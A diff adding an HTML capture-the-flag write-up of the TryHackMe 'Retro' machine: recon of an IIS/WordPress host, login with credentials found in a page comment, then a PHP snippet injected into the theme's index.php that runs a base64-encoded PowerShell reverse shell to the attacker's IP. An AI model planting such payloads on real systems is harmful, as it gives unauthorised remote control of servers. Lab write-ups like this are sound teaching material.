@@ -1,0 +1,137 @@
+<html><head>
+<style>
+    body {
+        font-family: Arial, sans-serif;
+        max-width: 800px;
+        margin: 0 auto;
+        padding: 20px;
+        line-height: 1.6;
+        background-color: #f4f4f4;
+    }
+    h1, h2, h3 {
+        color: #333;
+        border-bottom: 2px solid #ddd;
+        padding-bottom: 10px;
+        margin-bottom: 20px;
+    }
+    p {
+        margin-bottom: 20px;
+    }
+    img {
+        max-width: 100%;
+        height: auto;
+        display: block;
+        margin: 0 auto 20px auto;
+    }
+    code {
+        background-color: #f9f9f9;
+        border: 1px solid #ccc;
+        padding: 5px;
+        border-radius: 5px;
+    }
+    pre {
+        background-color: #333;
+        color: #f8f8f2;
+        padding: 10px;
+        border-radius: 5px;
+        overflow-x: auto;
+    }
+</style>
+</head><body><p>Hi everyone, in this article I would like to analyze <code>retro</code> from <code>TryHackMe</code> platform.</p>
+
+<p>Before I begin, let's attach our ip address to customized domain name -></p>
+
+<p><code>nano /etc/hosts</code></p>
+
+<p><code>ctrl+s and ctrl+x</code></p>
+
+<p><img src="./images/1.png" alt="alt text" /></p>
+
+<h2>Reconnaissance</h2>
+
+<p>For the reconnaissance, first of all, I conducted both <code>nmap</code>  and <code>whatweb</code> scans respectively. Due to the time constraints, <code>nmap</code> was a bit slow compared to <code>whatweb</code> especially for web application discovery.</p>
+
+<p><code>whatweb retro.thm</code></p>
+
+<p><img src="./images/2.png" alt="alt text" /></p>
+
+<p><img src="./images/3.png" alt="alt text" /></p>
+
+<p>As you can see above, we have a default <code>IIS</code> configuration screen, built in <code>.NET Framework</code>.</p>
+
+<p>Source code did not give any clues about our reconnaissance:</p>
+
+<p><img src="./images/4.png" alt="alt text" /></p>
+
+<p><code>dirsearch</code> did not show any  juicy findings -></p>
+
+<p><img src="./images/5.png" alt="alt text" /></p>
+
+<p>Therefore, I preferred <code>gobuster</code> to find anything useful -></p>
+
+<p><code>gobuster dir -u http://retro.thm -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt</code></p>
+
+<p><img src="./images/6.png" alt="alt text" /></p>
+
+<p>Finally, I moved given endpoint through browser -></p>
+
+<p><img src="./images/7.png" alt="alt text" /></p>
+
+<p>It is clear that even though the server consisting <code>IIS</code>, the technology that has been used was <code>PHP</code>.</p>
+
+<p><img src="./images/8.png" alt="alt text" /></p>
+
+<p>I just manually fuzz the given page and then I encountered a page indicating the author name <code>Wade</code> and the application <code>WordPress</code>.</p>
+
+<p><img src="./images/9.png" alt="alt text" /></p>
+
+<p>Before I manually fuzz the entire endpoints, I started <code>Gobuster</code> again -></p>
+
+<p><code>gobuster dir -u http://retro.thm/retro/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt</code></p>
+
+<p><img src="./images/10.png" alt="alt text" /></p>
+
+<p>At the same time <code>nmap</code> results were prompted on the terminal screen -></p>
+
+<p><code>sudo nmap -sV -sC -Pn retro.thm</code></p>
+
+<p><img src="./images/11.png" alt="alt text" /></p>
+
+<p>It was the proof of concept of the Windows OS.</p>
+
+<p>Let me also conduct <code>wpscan</code> -></p>
+
+<p><img src="./images/12.png" alt="alt text" /></p>
+
+<p>There was not anything correlated with creds of the <code>Wade</code>. However, after I manually examine the page there was a comment leave like a password -></p>
+
+<p><img src="./images/13.png" alt="alt text" /></p>
+
+<p>Authentication attempt was successful as <code>Wade</code> user -></p>
+
+<p><code>Wade:parvizal</code></p>
+
+<p><img src="./images/14.png" alt="alt text" /></p>
+
+<p><strong>Notice:</strong>  I also commented on one of the posts appealing on thread :)</p>
+
+<p><img src="./images/15.png" alt="alt text" /></p>
+
+<p>Because of my operating system, I must execute the payload through <code>Powershell</code> -></p>
+
+<p><img src="./images/16.png" alt="alt text" /></p>
+
+<p>Since I could not find any <code>PHP</code> programs' endpoints, I directly embedded such payload through <code>Theme Editor -&gt; index.php</code> main application -></p>
+
+<p><code>
+&lt;?php
+$command = 'cmd /c powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQA0AC4AOQAyAC4AMQA4ADkAIgAsADQANAA0ADQAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA';
+exec($command, $output, $return_var);
+echo "&lt;pre&gt;" . implode("\n", $output) . "&lt;/pre&gt;";
+?&gt;
+</code></p>
+
+<p><img src="./images/17.png" alt="alt text" /></p>
+
+<p><img src="./images/18.png" alt="alt text" /></p>
+</body></html>
